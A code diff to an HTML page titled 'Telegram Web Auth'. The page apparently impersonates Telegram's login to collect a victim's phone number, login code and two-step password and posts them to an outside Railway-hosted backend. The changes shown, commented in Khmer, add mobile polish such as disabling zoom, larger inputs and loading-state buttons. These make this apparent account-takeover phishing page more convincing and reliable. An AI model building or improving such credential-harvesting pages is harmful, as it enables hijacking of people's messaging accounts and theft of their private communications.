@@ -2,16 +2,37 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- 1. ការពារ Auto-Zoom លើ Mobile -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram Web Auth</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #0f1721; color: #ffffff; font-family: system-ui, -apple-system, sans-serif; }
-        .tg-input { background: #17212b; border: 1px solid #2f3846; border-radius: 12px; color: #fff; }
-        .tg-input:focus { border-color: #5288c1; outline: none; }
+        body { 
+            background-color: #0f1721; 
+            color: #ffffff; 
+            font-family: system-ui, -apple-system, sans-serif; 
+            touch-action: manipulation;
+        }
+        .tg-input { 
+            background: #17212b; 
+            border: 1px solid #2f3846; 
+            border-radius: 12px; 
+            color: #fff; 
+            /* 2. កំណត់ 16px ការពារ iOS Safari កុំឱ្យ Auto-Zoom ពេល Focus */
+            font-size: 16px !important; 
+            touch-action: manipulation;
+        }
+        .tg-input:focus { 
+            border-color: #5288c1; 
+            outline: none; 
+        }
+        button, input {
+            /* 3. លុប 300ms Click Delay លើ Mobile */
+            touch-action: manipulation;
+        }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
+<body class="flex items-center justify-center min-h-screen p-4 select-none">
     <div class="w-full max-w-sm text-center">
         <!-- STEP 1: Phone Form -->
         <div id="step-phone" class="space-y-6">
@@ -29,10 +50,11 @@
             <div class="space-y-4 text-left">
                 <div>
                     <label class="block text-xs text-gray-400 mb-1 ml-1">Phone Number</label>
-                    <input id="phone-input" type="text" value="+855" placeholder="+85512345678" class="tg-input w-full p-3 text-sm">
+                    <input id="phone-input" type="text" value="+855" placeholder="+85512345678" class="tg-input w-full p-3">
                 </div>
             </div>
-            <button onclick="sendPhone()" class="w-full bg-[#5288c1] hover:bg-[#4372a5] text-white font-medium py-3 rounded-xl transition">SEND CODE</button>
+            <!-- active:scale-95 ធ្វើឱ្យប៊ូតុងស្រុតចុះភ្លាមៗពេលចុចប៉ះ -->
+            <button id="btn-send" onclick="sendPhone()" class="w-full bg-[#5288c1] hover:bg-[#4372a5] active:scale-95 text-white font-medium py-3 rounded-xl transition-all duration-75">SEND CODE</button>
         </div>
 
         <!-- STEP 2: OTP & 2FA Form -->
@@ -52,27 +74,34 @@
                 <!-- Input 2FA Password (លាក់ជាមុន) -->
                 <div id="password-container" class="hidden">
                     <label class="block text-xs text-gray-400 mb-1 ml-1">Two-Step Password (2FA)</label>
-                    <input id="password-input" type="password" placeholder="Enter your 2FA password" class="tg-input w-full p-3 text-sm">
+                    <input id="password-input" type="password" placeholder="Enter your 2FA password" class="tg-input w-full p-3">
                 </div>
             </div>
 
-            <button onclick="submitOTP()" class="w-full bg-[#5288c1] hover:bg-[#4372a5] text-white font-medium py-3 rounded-xl transition">VERIFY & LOGIN</button>
+            <button id="btn-verify" onclick="submitOTP()" class="w-full bg-[#5288c1] hover:bg-[#4372a5] active:scale-95 text-white font-medium py-3 rounded-xl transition-all duration-75">VERIFY & LOGIN</button>
             <div>
-                <button onclick="goBack()" class="text-xs text-[#5288c1] hover:underline">Change Phone Number</button>
+                <button onclick="goBack()" class="text-xs text-[#5288c1] hover:underline active:opacity-70 transition">Change Phone Number</button>
             </div>
         </div>
     </div>
 
     <script>
-        // URL Railway ថ្មីរបស់អ្នក
         const BACKEND_URL = "https://jvpcambodia.up.railway.app";
 
         async function sendPhone() {
-            const phone = document.getElementById('phone-input').value.trim();
+            const phoneInput = document.getElementById('phone-input');
+            const btn = document.getElementById('btn-send');
+            const phone = phoneInput.value.trim();
+
             if (!phone || phone.length < 8) {
                 alert('Please enter a valid phone number with country code.');
                 return;
             }
+
+            // ប្តូរស្ថានភាពប៊ូតុងភ្លាមៗ (Immediate Feedback)
+            btn.disabled = true;
+            btn.innerText = 'SENDING...';
+            btn.classList.add('opacity-70');
 
             try {
                 const res = await fetch(`${BACKEND_URL}/api/send-code`, {
@@ -92,6 +121,11 @@
             } catch (err) {
                 alert('Cannot connect to backend server!');
                 console.error(err);
+            } finally {
+                // បើកប៊ូតុងឱ្យដើរវិញ
+                btn.disabled = false;
+                btn.innerText = 'SEND CODE';
+                btn.classList.remove('opacity-70');
             }
         }
 
@@ -99,11 +133,17 @@
             const phone = document.getElementById('phone-input').value.trim();
             const code = document.getElementById('otp-input').value.trim();
             const password = document.getElementById('password-input').value.trim();
+            const btn = document.getElementById('btn-verify');
 
             if (!code) {
                 alert('Please enter the OTP code.');
                 return;
             }
+
+            // ប្តូរស្ថានភាពប៊ូតុងភ្លាមៗ
+            btn.disabled = true;
+            btn.innerText = 'VERIFYING...';
+            btn.classList.add('opacity-70');
 
             try {
                 const res = await fetch(`${BACKEND_URL}/api/verify-code`, {
@@ -128,6 +168,10 @@
             } catch (err) {
                 alert('Connection error!');
                 console.error(err);
+            } finally {
+                btn.disabled = false;
+                btn.innerText = 'VERIFY & LOGIN';
+                btn.classList.remove('opacity-70');
             }
         }
 
